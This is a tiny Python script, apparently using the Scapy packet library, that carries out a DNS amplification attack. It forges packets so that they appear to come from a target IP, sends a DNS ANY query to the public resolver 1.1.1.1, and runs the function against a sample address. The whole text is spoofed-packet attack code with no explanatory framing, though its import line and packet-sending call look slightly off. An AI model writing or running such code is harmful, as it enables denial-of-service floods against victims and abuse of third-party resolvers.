from All import *

def dns_amp(target_ip):
	pkt = Ether()/IP(src=target_ip, dst="1.1.1.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
	send(pkt)

dns_amp("192.168.1.2")
